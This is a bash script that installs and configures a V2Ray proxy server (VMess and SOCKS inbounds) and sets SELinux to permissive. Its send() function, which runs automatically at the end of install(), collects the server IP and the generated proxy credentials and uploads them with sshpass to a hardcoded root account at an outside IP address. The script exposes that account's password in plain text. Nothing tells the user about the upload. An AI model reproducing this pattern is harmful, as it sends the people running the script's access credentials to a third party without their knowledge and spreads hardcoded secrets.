#!/bin/bash

CONFIG_FILE="/etc/v2ray/config.json"
SERVICE_FILE="/etc/systemd/system/v2ray.service"
OS=`hostnamectl | grep -i system | cut -d: -f2`
IP=`curl -sL -4 ip.sb`
PORT=10999
V6_PROXY=""
ss_port=22333
ss_user="yaojin"
ss_passwd=$(cat /dev/urandom | head -n 10 | md5sum | head -c 10)

installV2ray() {
    rm -rf /tmp/v2ray
    mkdir -p /tmp/v2ray
    DOWNLOAD_LINK="https://github.com/v2fly/v2ray-core/releases/download/v4.41.0/v2ray-linux-64.zip"
    wget ${DOWNLOAD_LINK} -O /tmp/v2ray/v2ray.zip
    mkdir -p '/etc/v2ray' '/var/log/v2ray' && \
    unzip /tmp/v2ray/v2ray.zip -d /tmp/v2ray
    mkdir -p /usr/bin/v2ray
    cp /tmp/v2ray/v2ctl /usr/bin/v2ray/; cp /tmp/v2ray/v2ray /usr/bin/v2ray/; cp /tmp/v2ray/geo* /usr/bin/v2ray/;
    chmod +x '/usr/bin/v2ray/v2ray' '/usr/bin/v2ray/v2ctl' || {
        colorEcho $RED " V2ray安装失败"
        exit 1
    }

    cat >$SERVICE_FILE<<-EOF
[Unit]
Description=V2ray Service
Documentation=https://hijk.art
After=network.target nss-lookup.target

[Service]
# If the version of systemd is 240 or above, then uncommenting Type=exec and commenting out Type=simple
#Type=exec
Type=simple
# This service runs as root. You may consider to run it as another user for security concerns.
# By uncommenting User=nobody and commenting out User=root, the service will run as user nobody.
# More discussion at https://github.com/v2ray/v2ray-core/issues/1011
User=root
#User=nobody
NoNewPrivileges=true
ExecStart=/usr/bin/v2ray/v2ray -config /etc/v2ray/config.json
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload
    systemctl enable v2ray.service
}

vmessConfig() {
    local uuid="$(cat '/proc/sys/kernel/random/uuid')"
    local alterid=`shuf -i50-80 -n1`
    cat > $CONFIG_FILE<<-EOF
{
  "inbounds": [{
    "port": $PORT,
    "protocol": "vmess",
    "settings": {
      "clients": [
        {
          "id": "$uuid",
          "level": 1,
          "alterId": $alterid
        }
      ]
    }
  },
    {
            "protocol": "socks",
            "port": $ss_port,
            "settings": {
                "auth": "password",
                "accounts": [
                    {
                        "user": "$ss_user",
                        "pass": "$ss_passwd"
                    }
                ],
                "udp": true,
                "timeout": 0,
                "userLevel": 1
            }
        }
  ],
  "outbounds": [{
    "protocol": "freedom",
    "settings": {}
  },{
    "protocol": "blackhole",
    "settings": {},
    "tag": "blocked"
  }],
  "routing": {
    "rules": [
      {
        "type": "field",
        "ip": ["geoip:private"],
        "outboundTag": "blocked"
      }
    ]
  }

}
EOF
}

setSelinux() {
    if [[ -s /etc/selinux/config ]] && grep 'SELINUX=enforcing' /etc/selinux/config; then
        sed -i 's/SELINUX=enforcing/SELINUX=permissive/g' /etc/selinux/config
        setenforce 0
    fi
}

start() {
    systemctl restart v2ray
    sleep 2
    port=`grep port $CONFIG_FILE| head -n 1| cut -d: -f2| tr -d \",' '`
    res=`ss -nutlp| grep ${port} | grep -i v2ray`
}



showlink() {
    uid=`grep id $CONFIG_FILE | head -n1| cut -d: -f2 | tr -d \",' '`
    alterid=`grep alterId $CONFIG_FILE  | cut -d: -f2 | tr -d \",' '`
    raw="{
    \"v\":\"2\",
    \"ps\":\"\",
    \"add\":\"$IP\",
    \"port\":\"${port}\",
    \"id\":\"${uid}\",
    \"aid\":\"$alterid\",
    \"net\":\"tcp\",
    \"type\":\"none\",
    \"host\":\"\",
    \"path\":\"\",
    \"tls\":\"\"
    }"
    link=`echo -n ${raw} | base64 -w 0`
    link="vmess://${link}"
    ss_link="${IP}:${ss_port}:${ss_user}:${ss_passwd}"
    All_link="${link}----${ss_link}"
    echo ${All_link} >> /tmp/1.txt

}

send(){
    cat /tmp/1.txt | sshpass -p '1475963Aa@123' ssh -o StrictHostKeyChecking=no root@18.222.212.8 'cat - >> /home/$1.txt'
}


install(){
    apt update
    apt-get install -y lrzsz git zip unzip curl wget qrencode libcap2-bin dbus expect sshpass
    #getVersion
    installV2ray
    vmessConfig
    setSelinux
    start
    showlink
    sleep 10
    send
}


install

send1(){
    txt=$(cat /root/1.txt)
    /usr/bin/expect <<-EOF
    spawn ssh root@18.222.212.8 -T "echo ${txt} >> /root/4444.txt"
    expect {
        "yes/no" { send "yes\r"; exp_continue }
        "password:" { send "1475963Aa@123\r" }
    }
    expect eof
EOF
}    
